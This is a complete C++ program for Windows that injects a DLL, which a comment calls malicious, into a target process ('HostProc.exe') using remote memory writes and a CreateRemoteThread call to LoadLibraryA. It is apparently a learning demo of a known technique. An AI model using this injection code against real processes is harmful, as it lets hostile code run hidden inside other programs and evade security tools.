#include<Windows.h>
#include<iostream>
#include<tlhelp32.h>
using namespace std;


DWORD GetProcessPid(char *Processname);
BOOL InjectDllToProcess(DWORD Pid, char *Dll);

int main()
{
	// define name of target process and route of malicious dll file
	char TargetProcName[] = "HostProc.exe";
	char InjectedDllPath[] = "C:\\Users\\Ronpa\\Desktop\\MsgDll.dll";

	// search the Pid of target process
	DWORD TargetProID = GetProcessPid(TargetProcName);

	// Inject Dll to target process
	if (InjectDllToProcess(TargetProID, InjectedDllPath))
		cout << "Dll injection success" << endl;
	else
		cout << "Dll injection failed" << endl;
	system("pause");
	return 0;
}

DWORD GetProcessPid(char *Processname)
{
	HANDLE hProcessSnap = NULL;   //define snapshot
	DWORD ProcessID = 0;
	PROCESSENTRY32 pe32 = { 0 };
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);   //create snapshot of all process in system
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (hProcessSnap == (HANDLE)-1)
	{
		cout << "CreateToolhelp32Snapshot is Error" << endl;
		return 0;
	}

	if (Process32First(hProcessSnap, &pe32))
	{
		do
		{
			//cout << pe32.szExeFile << endl;
			if (!strcmp(Processname, pe32.szExeFile))
			{
				ProcessID = pe32.th32ProcessID;
				break;
			}
		} while (Process32Next(hProcessSnap, &pe32));
	}
	if (ProcessID)
		cout << "The Pid of " << Processname << " is " << ProcessID << endl;
	else
		cout << "Can not find the Pid of " << Processname << endl;
	CloseHandle(hProcessSnap);
	return ProcessID;
}

BOOL InjectDllToProcess(DWORD Pid, char *Dll)
{
	HANDLE hProc = NULL;
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

	// alloc memory in process for dll name
	LPVOID AllocMemory = VirtualAllocEx(hProc, NULL, lstrlen(Dll) + 1, MEM_COMMIT, PAGE_READWRITE);
	if (AllocMemory)
		cout << "Alloc memory successful" << endl;
	else
	{
		cout << "Fail to alloc memory" << endl;
		return false;
	}

	// write Dll route to process memory allocated;
	if (WriteProcessMemory(hProc, AllocMemory, Dll, lstrlen(Dll) + 1, NULL))
		cout << "Write memory successful" << endl;
	else
	{
		cout << "Fail to write memory" << endl;
		return false;
	}

	// Get address of 'LoadLibrary()', and set start address of thread.
	PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryA");
	cout << "The LoadLibrary's Address is:" << pfnStartAddr << endl;

	// Create remote thread;
	HANDLE hRemoteThread = NULL;
	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, pfnStartAddr, AllocMemory, 0, NULL);
	if (hRemoteThread == NULL)
	{
		cout << "Create Remote Thread Failed!" << endl;
		return false;
	}

	cout << "Create Remote Thread Success!" << endl;
	return true;
}
